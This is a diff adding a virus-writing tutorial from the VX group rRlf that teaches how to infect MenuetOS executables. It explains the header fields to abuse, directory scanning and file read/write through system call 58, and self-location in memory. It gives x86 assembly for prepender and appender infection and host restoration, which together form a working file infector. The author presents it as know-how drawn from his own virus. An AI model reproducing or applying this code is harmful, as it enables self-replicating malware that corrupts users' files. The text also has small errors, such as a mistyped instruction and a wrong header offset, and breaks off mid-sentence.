@@ -1,0 +1,689 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************           MenuetOS infection         ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro words
+
+  1) File Format
+       a) General information
+       b) Application Structur
+       c) Header Information
+
+  2) System Calls
+       a) General Information
+       b) System Call 58
+
+  3) Virus functions
+       a) Find viruscode in memory
+       b) Find files
+       c) Directory entries
+       d) Read files to memory
+       e) Write memory to files
+
+  4) Infection Type
+       a) Prepender
+       b) Appender
+
+  5) Last words
+
+
+
+  0) Intro words
+
+  MenuetOS is a new and free Operating System with GUI (Graphical User Interface)
+  and many network tools like a eMail program or a IRC client, which fits on one disk.
+  The Operating System is fully assembler written and has a great documation, more
+  than that, it's open source. You can find the OS here: www.menuetos.org.
+  I got the idea of writing a virus for it, when I had the first contact with it:
+  One boring day in a IRC-channel VxF talked about it, and joked about writing viruses
+  for it. Well, that was the start of the whole story, and as I became bored of all
+  that windows based virus, I thought it would be a nice challenge for me. About five
+  month after that contact the first virus (Menuet.Oxymoron) was finished. As I had
+  to learn alot of it by myself, I want to share this information with you.
+  And that's also the only purpose of this article.
+
+
+
+
+  1) File Format
+
+        a) General information
+
+           MenuetOS first asks the user about the start configuration. After that
+           it loads the files (from disk or harddisk) to the memory. There the data
+           is available at directory '/RAMDISK/1/xxx'. The primary harddisk of your
+           computer is saved as '/HARDDISK/1/xxx'. That's a basic information, and
+           most important for the following dream (writing a MenuetOS virus).
+
+
+
+	b) Application Structur
+
+           The MenuetOS-file has a simple structur. It just consists of two parts:
+           The Header and the executeable code. It looks like that:
+
+           ----------------
+           ---          ---
+           ---  HEADER  ---
+           ---          ---
+           ----------------
+
+           ----------------
+           ---          ---
+           ---  EXECUTE ---
+           ---   ABLE   ---
+           ---          ---
+           ---   CODE   ---
+           ---          ---
+           ----------------
+
+          I will explain the header in the next part of the article. The executeable code
+          contains your commands and your data, which must not be executed, therefor it
+          will be intelligent if you write your data after the code, which means after the
+          end of your application or after the jump to the host code.
+          A very important information is, that every execution file are loaded at memory offset
+          0x0 (org 0x0). It's important because we could calculate with the static header
+          informations and not any calculting any relative offsets. In that case, for instance
+          the EP of the current file in memory is here: dword [0xC] (will be explained in the
+          next part).
+
+
+
+       c) Header information
+
+          The header is the most important part you have to think of when you want to write
+          a virus for this Operating System. There are two parts of header: the extanted and
+          the not-extanted one. The not-extanted header consists of 0x1C (=28) bytes, which
+          are very important. The extanted header has 8 bytes more than the other one, so
+          it's size is 0x24 (=36) bytes. After the header some programs store important data,
+          which means, the end of the header is not directly the beginning of the Executeable
+          code.
+          Now I want to show you the Menuet's header, and explain the different parts and their
+          use in a virus later on:
+
+          * Offset *  Length   *  Name                  *
+          ***********************************************
+          * 00h    *  8 bytes  *  File ID               *
+          * 08h    *  4 bytes  *  required OS           *
+          * 0Ch    *  4 bytes  *  Entry Point           *
+          * 10h    *  4 bytes  *  File length           *
+          * 14h    *  4 bytes  *  Used memory           *
+          * 18h    *  4 bytes  *  extanted header / esp *
+          ***********************************************
+          * 1Ch    *  4 bytes  *  Parameters            *
+          * 20h    *  4 bytes  *  Icon Information      *
+          ***********************************************
+
+
+          File ID:
+                   This 2 dword tell the OS, that it's an executeable file.
+                   The File ID should be 'MENUET00' or 'MENUET01'. I haven't
+                   found any difference between these two ways.
+
+          Required OS:
+                   This double word tells the OS, which version of MenuetOS
+                   it needs. Up to now (June 2004), Menuet exists in it's version
+                   0.77. The dword of a program which just run at MenuetOS 0.77+
+                   would contain the value '77'. But I have just seen two different
+                   values: 1 and 38. Due to this, and the fact, that it's not
+                   important for the file, we could use it as our virus sign.
+                   Just overwrite this value with a number less than 77 (but not 1
+                   or 38 :] ).
+
+          Entry Point:
+                   This is also a very important value for our virus. Here we
+                   get the information where the file's code starts. This value
+                   could be 0x1c, if it's no extanted header without data or much
+                   bigger, if it contains alot of data. Anyway, this value is also
+                   very important for finding the virus code in memory. If it's a
+                   prepender, the virus is at EP or if it's an appender, this is the
+                   value you could change, so that the virus runs first.
+
+          File length:
+                   This is the next important value. It's the size of the file, which
+                   means: Headerlength+codelength. This value is generated when the
+                   file is compiled. That means, if you add some bytes (the virus), the
+                   value won't change, which is perfect for writing a virus. If you want
+                   to write a prepender, you could store the first part of the host code
+                   at that offset, or if you want to write an appender, you could add
+                   your viruscode here.
+
+          Used memory:
+                   The doubleword is the amount of memory reserved by OS for the application.
+                   As the virus also uses alot of memory (reading files, file rebuilding),
+                   this is very important. You have to check if the value is bigger than
+                   your required memory. If you infect a file using too few memory, the file
+                   won't work anymore.
+
+          Extanted Header / esp:
+                   This part of the header tells us, if it uses an extanted header or not.
+                   If the dword is 0x0, it doesn't use an extanted header. Otherwise it
+                   uses one. In that case, the value is the offset of the stack (esp). It's
+                   not important for the file, because pop/push always works without that
+                   offset.
+
+          Parameters & Icon Information:
+                   These values are important for the host file, but not for us, therefor
+                   I won't explain it more exactly.
+
+
+
+
+  2) System Calls
+
+       a) General information
+
+          System Calls are the only way how you can communicate with the OS.
+          Such a System call allow you to use general functions of the OS.
+          To find information about that calls, you have to look at the sysfuncs.txt
+          file included in the MenuetOS-package. There you can find the exact way
+          of using every of the 66 (some of them aren't finished so far) calls.
+          Generally a call looks like this:
+
+          eax = function numbers
+          ebx, ecx, edx, esi, edi = information for the call
+          int 0x40 = System call
+
+          An example - sysfuncs.txt contains this content:
+
+          - - - - - - - - - -
+          05 = DELAY X/100 SECS
+
+              ebx delay in 1/100 secs
+              ret: nothing changed
+          - - - - - - - - - -
+
+          If we want a 0.5 second delay in our program, we have to do it as the following
+          code shows you:
+
+          - - - - - - - - - -
+          mov  eax, 5	        ; Function number: DELAY X/100 SECS
+          mov  ebx, 50          ; 50/100 sec = 0.5 seconds
+          int  0x40             ; System call
+          - - - - - - - - - -
+
+
+
+       b) System Call 58
+
+          System Call 58 is the only important function for our virus.
+          Information about Function 58 by sysfuncs.txt:
+
+          - - - - - - - - - -
+          58 = SYSTEM TREE ACCESS
+
+               ebx    pointer to fileinfo block
+
+               path examples:
+
+               '/RAMDISK/FIRST/KERNEL.ASM',0
+               '/RD/1/KERNEL.ASM',0
+
+               '/HARDDISK/FIRST/KERNEL.ASM',0
+               '/HD/1/KERNEL.ASM',0
+               '/HARDDISK/FIRST/MENUET/PICS/TANZANIA.BMP',0
+
+               fileinfo:
+
+               dd   0                    ; 0=READ    (delete/append)
+               dd   0x0                  ; 512 block to read 0+
+               dd   0x1                  ; blocks to read (/bytes to write/append)
+               dd   0x20000              ; return data pointer
+               dd   0x10000              ; work area for os - 16384 bytes
+               db   '/RAMDISK/FIRST/KERNEL.ASM',0  ; ASCIIZ dir & filename
+
+               or
+
+               fileinfo:
+
+               dd   1                    ; 1=WRITE
+               dd   0x0                  ; not used
+               dd   10000                ; bytes to write
+               dd   0x20000              ; source data pointer
+               dd   0x10000              ; work area for os - 16384 bytes
+               db   '/RAMDISK/FIRST/KERNEL.ASM',0  ; ASCIIZ dir & filename
+
+               or
+
+               ; LBA
+
+               fileinfo:
+
+               dd   8                    ; 8=LBA read (/9=LBA write)
+               dd   0x0                  ; 512 block to read (write)
+               dd   0x1                  ; set to 1
+               dd   0x20000              ; return data pointer
+               dd   0x10000              ; work area for os (16384 bytes)
+               dd   '/HARDDISK/SECOND',0 ; physical device ; ASCIIZ
+
+                    ( or /rd/1/ )
+
+                    LBA read must be enabled with setup
+
+               NOTE: The asciiz in this context refers to the physical device and
+                     not to logical one.
+                     For hd: first=pri.master, second=pri.slave
+                             third=sec.master, fourth=sec.slave
+
+               or
+
+               fileinfo:
+   
+               dd   16                   ; 16=START APPLICATION
+               dd   0x0                  ; nop
+               dd   param                ; 0 or parameter area (ASCIIZ)
+               dd   0x0                  ; nop
+               dd   0x10000              ; work area for os - 16384 bytes
+               db   '/HD/1/MENUET/APPS/FIRE',0  ; ASCIIZ dir & filename
+   
+               ret: eax = pid or 0xfffffff0+ for error
+          - - - - - - - - - -
+
+          This way we can find files, read file contents and write files, but this
+          be explained later on.
+
+
+
+
+  3) Virus functions
+
+       a) Find viruscode in memory
+
+          Finding the code of the virus in memory is very important for the virus,
+          otherwise you can't infect other files. Now there are two ways to find
+          the code, which depends on what kind of virus it is - a prepender or appender.
+          (I don' think of EPO infectors so far).
+          The easiest way to find the code is a call, and you pop your offset from the
+          stack to a register. But a bad thing at saving it in a register is, that you
+          can't use that register anymore (because the offset must not be overwritten).
+          Information about CALL by OPCODES2.HLP:
+
+          - - - - - - - - - -
+                  Pushes Instruction Pointer (and Code Segment for far calls) onto
+                  stack and loads Instruction Pointer with the address of proc-name.
+          - - - - - - - - - -
+
+          If you call a lable at the start of the virus, the stack contains the offset
+          call. And that's the assembler source for this way:
+
+          - - - - - - - - - -
+                call    virus           ; Push current memory offset to stack
+         virus:
+                pop     ecx             ; Pop current memory offset to ecx
+                sub     ecx, 5          ; Get the startoffset of the viruscode in memory
+                xchg    ebp, ecx        ; Move ecx to ebp <- NOTE: You must not pop ebp, 
+                                        ;                    otherwise the OS freezes.
+          - - - - - - - - - -
+
+          As I told you, there is another way to find the Virusstart-offset, I'll tell you now:
+          Prepender: This type infects files before the real code = at the Entry Point.
+                     As you know from header-information that the Entry Point of the code
+                     is at offset dword [0xC] and the application is loaded at org 0x0, we
+                     can use the following code:
+
+          - - - - - - - - - -
+          mov   ebp, dword [0xC]        ; ebp = 0x0 + dword [0xC]
+          - - - - - - - - - -
+
+          Appender: The other type of viruses infects files behind the file. Now we know the
+                    memory start of the file (org 0x0), and the filelength of the infected
+                    file: dword [0x10]. So we can do the same thing again.
+
+          - - - - - - - - - -
+          mox ebp, dword [0x10]         ; ebp = 0x0 + dword [0x10]
+          - - - - - - - - - -
+
+
+
+
+       b) Find files
+
+          This is of corse on of the most important parts of a virus, and in MenuetOS it's
+          not that easy. The reason for that is, that there is no direct function for it.
+          But, as I have told you, we have SYSTEM CALL 58, which could do that for us.
+          With function 58 we can read files, but not only, we can even read directory
+          entries. Just look at the following example:
+
+          - - - - - - - - - -
+          mov  eax, 58
+          mov  ebx, dir_block
+          int  0x40
+
+          dir_block:
+               dd   0                    ; 0=READ
+               dd   0x0                  ; size of reading block: 512 + x
+               dd   0x16                 ; blocks to read = 16*512 = 8192 bytes
+               dd   0x20000              ; Offset where to save data
+               dd   0x10000              ; work area for os - 16384 bytes
+               db   '/RAMDISK/FIRST',0   ; Directory Name
+          - - - - - - - - - -
+
+          Now we have the directory entries at memory offset 0x20000. The exact information
+          about that will follow in the next capture. For now it's just important to know, that
+          the first filename (always 11 letters) is at offset 0x0, and the whole information
+          of one file is 32 bytes. That means, you can find files here: 0x0, 0x20, 0x40, 0x60, ...
+          As we read 16*512 bytes, we got 100 files.
+          You could get the filenames with a code like that:
+
+          - - - - - - - - - -
+                   mov  ebx, 0x20000    ; Offset in memory
+
+          nextfile:
+                  add   ebx, 32	        ; Get next file-start-offset
+                  cmp   ebx, 0x22000    ; Compair if we got all file
+                  jne   nextfile        ; If not, get next file
+          - - - - - - - - - -
+
+
+
+       c) Directory Entries
+
+          Last capter talked about finding files via Directory Entries, but so far I
+          haven't explained you the 32 bytes of a file. Well, here we are.
+          The Directory Entry contains important informations like the file attributes
+          or the information about a deleted file. We have to use this informations
+          for avoiding the infection of deleted files or directories. If we don't avoid
+          them, the virus will freeze the system. Now look at the following list:
+
+          - - - - - - - - - -
+          struct msdos_dir_entry {
+          __u8name[8],ext[3];/* name and extension */       <-- IMPORTANT
+          __u8attr;/* attribute bits */                     <-- IMPORTANT
+          __u8    lcase;/* Case for base and extension */
+          __u8ctime_ms;/* Creation time, milliseconds */
+          __u16ctime;/* Creation time */
+          __u16cdate;/* Creation date */
+          __u16adate;/* Last access date */
+          __u16   starthi;/* High 16 bits of cluster in FAT32 */
+          __u16time,date,start;/* time, date and first cluster */
+          __u32size;/* file size (in bytes) */              <-- IMPORTANT
+          };
+          - - - - - - - - - -
+
+          I have already told you, that the first 11 bytes contain the file name.
+          But it contains also another information: If the first byte of the filename
+          is 0xE5, we have a deleted file. To avoid them you should compair the
+          first byte of the filename with 0xE5, and if it's equal, get the next file.
+
+          The attribute bytes contains 7 values:
+
+          - - - - - - - - - -
+          #define ATTR_NONE    0  /* no attribute bits */
+          #define ATTR_RO      1  /* read-only */
+          #define ATTR_HIDDEN  2  /* hidden */
+          #define ATTR_SYS     4  /* system */
+          #define ATTR_VOLUME  8  /* volume label */
+          #define ATTR_DIR     16 /* directory */           <-- IMPORTANT
+          #define ATTR_ARCH    32 /* archived */
+          - - - - - - - - - -
+
+          If ATTR_DIR = 1, we have a directory, and we should avoid to infect it.
+          To do this, you could use the following code:
+
+          - - - - - - - - - -
+          mov   cl, [ebx+11]    ; Move the attribute bits to cl
+          and   cl, 0x10        ; AND 0x10 ( ???1 ???? = FOLDER )
+          jnz   nextfile        ; If not zero, get next file
+          - - - - - - - - - -
+
+          The last important part of the Directory Entries is the filesize.
+          You need the filesize for reading the file to memory, because MenuetOS
+          don't allow us to read a whole file, but we have to include the length
+          which we want to read.
+
+
+
+       d) Read files to memory
+
+          We have to read our filecontent to the memory, because we just can infect the
+          file (= include the virus code and do some other stuff) in memory. To do that,
+          we have to search the System Call, which can do it. Well, the call is´, again,
+          the function 58. Look at a code reading a file:
+
+          - - - - - - - - - -
+          mov   eax, 58
+          mov   ebx, fileinfo
+          int   0x40
+
+          
+          fileinfo:
+
+               dd   0                    ; 0=READ
+               dd   0x0                  ; 512+x / block to read
+               dd   0x1                  ; blocks to read
+               dd   0x20000              ; return data pointer
+               dd   0x10000              ; work area for os - 16384 bytes
+               db   '/RAMDISK/FIRST/FILENAME',0  ; ASCIIZ dir & filename
+          - - - - - - - - - -
+
+          Now we two problems: First: We don't know how much blocks we have to read (because
+          every file has a different filesize) and second we don't have the filename at the
+          fileblock. We just have both information at the Directory Entry. What to do?
+          As our code is executed at 0x0 in memory, we could write that informations to memory
+          via 'stos'. But one more problem: The filesize at the Directory Entry is stored in bytes,
+          but we need the blocks we have to read. A solution is the Assembler-command 'shr'.
+
+          - - - - - - - - - -
+                  Shifts the destination right by "count" bits with zeroes shifted
+                  in on the left.  The Carry Flag contains the last bit shifted out.
+          - - - - - - - - - -
+
+          Let me show you, how that works. Let's say, we have a file with the size with 10.000 bytes:
+          mov eax, filesize     <-- eax = 10011100010000b
+          shr eax, 9            <-- eax = 10011b = 19d = 19 blocks
+          inc eax               <-- eax = 20d
+                                <-- 20*512 = 10.240 = we read got all bytes of the file
+ 
+          Let's have a look at that:
+
+          - - - - - - - - - -
+          ;; ebx=offset of filename at Directory Entry
+
+          mov   eax, dword [ebx+28]     ; Move the filesize to eax
+          shr   eax, 9                  ; Get the blocks to read
+          inc   eax		        ; For reading the last not completed block
+
+          mov   edi, flb_bs             ; Move the offset of the 
+          stosb                         ; Write [al] to di in memory (number of blocks to flb_bs)
+
+          mov   ecx, 11                 ; Move 11 to ecx (counter=11)
+     fn2fb:                             ; File Name to File Block
+          mov   al, [ebx]               ; Move the ebx-value to al
+          stosb                         ; Write al to memory at offset edi (=11 letter buffer)
+          inc   ebx                     ; Get next letter
+     loop       fn2fb                   ; Jump to fn2fb if ecx>0 && dec ecx
+
+          mov   eax, 58                 ; SYSTEM TREE ACCESS
+          mov   ebx, fileblock          ; ebx=offset of fileblock
+          int   0x40                    ; SYSTEM CALL
+
+          file_block:
+                  dd   0
+                  dd   0x0
+          flb_bs: dd   0x1              ; How much blocks to read (filesize/512)
+                  dd   0x25000          ; Here the filecontent will be stored
+                  dd   0x10000
+                  db '/RAMDISK/FIRST/'  ; This is the Direction we want to infect
+          fle     db '           ',0    ; The 11 byte buffer for the filename 0-ended
+          - - - - - - - - - -
+
+          This way we read the whole file to 0x25000 in memory. We just have to rewrite the code
+          in memory and write the memory-content at that offset back to the file.
+
+
+
+       e) Write memory to files
+
+          After rewriting the file in memory, we have to write the file back. All we need we have.
+          The filename in memory in the file-block, the numbers of blocks at the right address. The only
+          thing we have to do is to change the first dword in the file-block. This dword is the kind
+          of action (read/write, append and delete aren't ready so far). Well, we could use two different
+          fileblocks, but that way we have to copy the filenames and the numbers of blocks. Well, I'll
+          explain how to do it with one block. We have to write at address of file_block beginn the
+          option 1. Let's look at the source:
+
+          - - - - - - - - - -
+          add   edi, file_block  ; Offset of fileblock
+          mov   al, 1            ; What to write (1 for writing)
+          stosb                  ; Write al to memory at offset edi
+
+          mov   eax, 58          ; SYSTEM TREE ACCESS
+          mov   ebx, file_block  ; File_block offset to ebx
+          int   0x40             ; SYSTEM CALL
+
+          file_block:
+                  dd   0                ; First it's read, but we need write
+                  dd   0x0
+          flb_bs: dd   0x1              ; How much blocks to read (filesize/512 - still there)
+                  dd   0x25000          ; The content of this offset will be written to the file
+                  dd   0x10000
+          filen   db '/RAMDISK/FIRST/'  ; This is the Direction we want to infect
+          fle     db '           ',0    ; The 11 byte buffer for the filename 0-ended (still there)
+          - - - - - - - - - -
+
+          This code writes the 'WRITE-option' to fileblock-start, and then write flb_bs*512 bytes to
+          filen until there is a NULL. The full filename and the numbers of fileblocks to write are
+          still there because of the reading before.
+
+
+
+
+  4) Infection Type
+
+       a) Prepender
+
+          A Prepender virus infects its victim infront of the original host code and stores the
+          code of the first part of the file at the end of the file. Such a file looks like that:
+
+          Uninfected Sample:           Infected Sample:
+
+          ++++++++++++                 +++++++++++++
+          ++        ++                 ++         ++
+          ++ HEADER ++                 ++ HEADER  ++
+          ++        ++                 ++         ++
+          ++++++++++++                 +++++++++++++
+          ++++++++++++                 *************
+          ++        ++                 **  VIRUS  **
+          ++  HOST  ++                 *************
+          ++        ++                 +++++++++++++
+          ++  CODE  ++                 ++ REST OF ++
+          ++        ++                 ++   HOST  ++
+          ++++++++++++                 +++++++++++++
+                                       #############
+                                       ##  START  ##
+                                       ## OF HOST ##
+                                       #############
+
+          The virus searchs for the filesize of the host first. Than it copies the first bytes,
+          which will be the virus-buffer, to an offset. This offset depends on the filesize.
+          If the virus+header of file is bigger than the file, we would overwrite the restored
+          bytes with the virus. Under that contition we have to restore the code at offset
+          [viruslength+headerlenght]. Otherwise, if the file is bigger, we have to write the
+          first hostpart at the end of the file. Next step is to infect the file, which means
+          to insert the virusbody to the buffer at the filestart. The filestart is, as we already
+          know, at offset 'dword [0xC]' stored. The filelength is at offset 'dword [0xC]'.
+          After successful execution of the virus, we give the control back to the host.
+          We have to write the original host-start (which is at the end of the file = dword [0x10]
+          or at dword [0xC]+viruslength: You just have to check) back to the real file-start
+          (dword [0xC]). We have to write the length of the virus to the filestart. But now we
+          have one big problem: We can't overwrite our code as long as it is still running
+          (writing back the host), so we have to be tricky: We write the restoring code for
+          the host to a unused memory address and jump to that address.
+          Look at the source:
+
+          - - - - - - - - - -
+          rebu:                         ; Rebuild the host code
+                mov     ebx, dword [0x10]        ; Move the file length to ebx, to get the old hostcode offset
+
+                mov     edx, dword [0xC]        ; Move the offset of the head-length to edx
+                add     edx, viruslength        ; Add the viruslength to edx
+
+                cmp     ebx, edx        ; Check if the file is smaller than the virus
+                jge     notsmall2       ; If not greater or equal, go on
+
+                mov     ebx, edx        ; Move the new offset to ebx
+
+           notsmall2:
+
+                mov     edi, dword [0xC]        ; Where to write: 0xC
+                mov     ecx, viruslength        ; How much to write
+
+               rbhc:                    ; Rebuild host code
+                mov     al, [ebx]       ; One byte of the saved host code to al
+                stosb                   ; Write al (Host code) to edi (Entry Point of file)
+                inc     ebx             ; Get next byte
+               loop rbhc                ; Jump to rbch if ecx>0 && inc ecx
+
+               jmp      dword [0xC]     ; Jump to Entry Point, now with the original code
+           rebuend:                     ; Rebuild host code: End
+          - - - - - - - - - -
+
+
+
+       b) Appender
+
+          This is the second infection type. This kind of virus copies the virus after the whole
+          file and modifies the header, exactly the Entry Point. After the infection is finished,
+          the virus restores jumps the original Entry Point. The infected file looks like this:
+
+
+          Uninfected Sample:           Infected Sample:
+
+          ++++++++++++                 ++++++++++++++
+          ++        ++                 ++ MODIFIED ++
+          ++ HEADER ++                 ++  HEADER  ++
+          ++        ++                 ++          ++
+          ++++++++++++                 ++++++++++++++
+          ++++++++++++                 ++++++++++++++
+          ++        ++                 ++          ++
+          ++  HOST  ++                 ++   HOST   ++
+          ++        ++                 ++          ++
+          ++  CODE  ++                 ++   CODE   ++
+          ++        ++                 ++          ++
+          ++++++++++++                 ++++++++++++++
+                                       **************
+                                       **  VIRUS   **
+                                       ** JUMP TO  **
+                                       **    EP    **
+                                       **************
+
+          An Appender searchs for the filesize and copies itself to that offset. After that, it
+          searchs for the Entry Point, overwrite it with the virusstart (dword [0xC]=dword[0x10]).
+          Than it writes the original Entry Point to the offset of the jump, which gives back the
+          control to the host. This way MenuetOS will execute the virus infront of the host, which
+          will be executed after the virus starts.
+
+
+
+
+  5) Last words
+
+     Finally, I want to say that I'm very happy after finish this article. This project (MenuetOS)
+     used some hunderts of hours. First I had to analyse the way MenuetOS works, than I had to read
+     many sources of Menuet-executeables, and I tried to understand them (which was sometimes very
+     hard, because not everything was explained). Than learning about the Systemcalls and other
+     Menuet things was nessecary. Next step to learn was the file-format (at least the header).
+     Time went on, and I stared to understand how everything worked. Simple codes by me did what
+     they were suposed to do, and out of some simple codes, a new virus was born.
+     The reason, why I have written this article is the fact, that I didn't want to let the whole
+     informations I collected last few month became lost. Well, here is that collection.
+     In the end, and this should be it, it's important for me to say 'Thank You' to some persons,
+     who were very important for all my MenuetOS descovering:
+
+       - Ville Mikael Turjanmaa
+                                The main-coder and founder of MenuetOS. (www.menuetos.org)
+                                You seems to be a really cool and damn smart guy. MenuetOS
+                                is a great field for learning about assembly language and
+                                OS developing. It really helped me alot to increase my asm
+                                knowlegde. This way I want to say Thanks for you, and also
+                      
